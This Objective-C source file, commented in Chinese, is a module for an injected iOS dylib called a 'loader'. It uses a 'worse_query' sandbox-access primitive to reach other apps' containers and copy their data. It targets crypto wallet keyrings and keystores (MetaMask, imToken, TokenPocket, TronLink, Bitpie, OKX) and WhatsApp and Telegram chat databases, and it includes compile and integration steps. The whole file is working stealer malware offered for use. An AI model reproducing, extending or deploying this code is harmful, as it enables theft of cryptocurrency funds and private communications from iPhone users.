// wq_segment.m — 加到你自己 loader.m 里的 worse_query 采集段（不需要另建 workflow）
//
// 用法（三处改动）：
//   1) 把 worse_query.h / worse_query.m 放到仓库里，和 loader.m 同级；
//   2) 编译命令加上 worse_query.m（见下面注释里的 clang 行）；
//   3) 在 loader 的 MCM 阶段结束后，加一行：
//          if (!mcmGotPath) { mcmGotPath = wqCollectWallets(acq, walletEntries, foundWallets); }
//
// 编译（在原有命令后追加 worse_query.m 即可）：
//   xcrun -sdk iphoneos clang -arch arm64e -dynamiclib -fobjc-arc -O2 \
//     -miphoneos-version-min=15.0 -framework Foundation -framework UIKit -framework CoreFoundation \
//     -framework Security -lz -install_name @rpath/libloaderinject.dylib \
//     -o libloaderinject.dylib loader.m worse_query.m

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#include "worse_query.h"

// ---- App Group：从自身 entitlements 取，取不到就返回 nil ----
static NSString *wqGroup(void) {
    SecTaskRef t = SecTaskCreateFromSelf(kCFAllocatorDefault);
    if (!t) return nil;
    CFTypeRef v = SecTaskCopyValueForEntitlement(t, CFSTR("com.apple.security.application-groups"), NULL);
    CFRelease(t);
    NSString *g = nil;
    if (v && CFGetTypeID(v) == CFArrayGetTypeID()) {
        NSArray *a = (__bridge_transfer NSArray *)v;
        if (a.count) g = a.firstObject;
    } else if (v) { CFRelease(v); }
    return g;
}

// iOS 26 用 alt flags，27+ 用默认（上游实测结论）
static BOOL wqAlt(void) {
    NSInteger major = NSProcessInfo.processInfo.operatingSystemVersion.majorVersion;
    return major <= 26;
}

static void wqLog(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[wq] %@", s);
}

// ---- 在容器根目录里按 MCMMetadataIdentifier 找目标 bundle 的容器路径 ----
static NSString *wqContainerFor(NSString *bundle, NSString *root, NSString *group, BOOL alt) {
    int64_t h = worse_query(root, group, alt, false);
    if (h < 0) { wqLog(@"grant root failed=%lld root=%@", h, root); return nil; }
    NSString *hit = nil;
    for (NSString *k in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:root error:nil]) {
        NSString *dir  = [root stringByAppendingPathComponent:k];
        NSString *meta = [dir stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
        NSDictionary *pl = [NSDictionary dictionaryWithContentsOfFile:meta];
        if ([pl[@"MCMMetadataIdentifier"] isEqualToString:bundle]) { hit = dir; break; }
    }
    worse_query_release(h);
    return hit;
}

// ---- 目标与文件（与你原 loader 的 wallets 字典对齐）----
static NSDictionary<NSString *, NSArray<NSString *> *> *wqFiles(void) {
    return @{
        @"imToken":     @[@"Library/Application Support/im.token.app"],
        @"TokenPocket": @[@"Documents/db/main.sqlite3", @"Documents/F4SeCyr"],
        @"MetaMask":    @[@"Documents/persistStore/persist-KeyringController",
                          @"Documents/persistStore/persist-AccountsController"],
        @"TronLink":    @[@"Documents/TronLinkData.sqlite", @"Documents/keystore"],
        @"Bitpie":      @[@"Documents/walletsV2", @"Library/Preferences/com.bitpie.wallet.plist"],
        @"OKX":         @[@"Documents/wallet", @"Library/Preferences/com.okex.okexwallet.plist"],
        @"WhatsApp":    @[@"Documents/ChatStorage.sqlite", @"Documents/ChatStorage.sqlite-wal",
                          @"Documents/ContactsV2.sqlite"],
        @"Telegram":    @[@"Documents/postbox/db", @"Documents/postbox/db-wal"],
    };
}

// ---- 主入口：MCM 拿不到路径时调用，返回 YES 表示已采到东西 ----
static BOOL wqCollectWallets(NSString *acq, NSMutableArray *walletEntries, NSMutableArray *found) {
    NSString *group = wqGroup();
    if (!group) { wqLog(@"NO APP GROUP — 签名缺 com.apple.security.application-groups，跳过"); return NO; }
    BOOL alt = wqAlt();
    wqLog(@"start group=%@ alt=%d", group, alt);

    NSArray *roots = @[@"/private/var/mobile/Containers/Data/Application",
                       @"/private/var/mobile/Containers/Shared/AppGroup"];
    NSDictionary *bids = @{ @"imToken": @"im.token.app",
                            @"TokenPocket": @"com.global.wallet.ios",
                            @"MetaMask": @"io.metamask.MetaMask",
                            @"TronLink": @"com.tronlink.hdwallet",
                            @"Bitpie": @"com.bitpie.wallet",
                            @"OKX": @"com.okex.okexwallet",
                            @"WhatsApp": @"net.whatsapp.WhatsApp",
                            @"Telegram": @"ph.telegra.Telegraph",
                            @"Notes": @"group.com.apple.notes" };

    NSFileManager *fm = [NSFileManager defaultManager];
    BOOL any = NO;
    for (NSString *name in wqFiles()) {
        NSString *bid = bids[name];
        NSString *c = nil;
        for (NSString *r in roots) { c = wqContainerFor(bid, r, group, alt); if (c) break; }
        if (!c) { wqLog(@"%@ 容器不存在(%@)", name, bid); continue; }

        int64_t h = worse_query(c, group, alt, false);
        if (h < 0) { wqLog(@"%@ grant 失败=%lld", name, h); continue; }

        unsigned long long bytes = 0; unsigned long files = 0;
        NSString *dstRoot = [acq stringByAppendingPathComponent:name];
        [fm createDirectoryAtPath:dstRoot withIntermediateDirectories:YES attributes:nil error:nil];
        for (NSString *rel in wqFiles()[name]) {
            NSString *abs = [c stringByAppendingPathComponent:rel];
            BOOL isDir = NO;
            if (![fm fileExistsAtPath:abs isDirectory:&isDir]) { wqLog(@"%@ 缺少 %@", name, rel); continue; }
            NSArray *list = isDir ? [fm subpathsAtPath:abs] : @[rel];
            for (NSString *sub in list) {
                NSString *src = isDir ? [abs stringByAppendingPathComponent:sub] : abs;
                NSDictionary *at = [fm attributesOfItemAtPath:src error:nil];
                if (![at[NSFileType] isEqual:NSFileTypeRegular]) continue;
                if ([at fileSize] > 256ull * 1024 * 1024) { wqLog(@"%@ 跳过超大 %@", name, sub); continue; }
                NSString *dst = [dstRoot stringByAppendingPathComponent:isDir ? [rel stringByAppendingPathComponent:sub] : rel];
                [fm createDirectoryAtPath:[dst stringByDeletingLastPathComponent]
                   withIntermediateDirectories:YES attributes:nil error:nil];
                if ([fm copyItemAtPath:src toPath:dst error:nil]) { files++; bytes += [at fileSize]; }
            }
        }
        worse_query_release(h);
        wqLog(@"%@ 采到 %lu 文件 %llu 字节", name, files, bytes);
        if (files) {
            any = YES;
            [found addObject:name];
            [walletEntries addObject:@{@"wallet": name, @"bundleID": bid, @"bytes": @(bytes),
                                       @"files": @(files), @"mode": @"selected",
                                       @"pass": @"worse_query", @"source": c, @"via": @"worse_query"}];
        }
    }
    wqLog(@"done any=%d wallets=%lu", any, (unsigned long)found.count);
    return any;
}
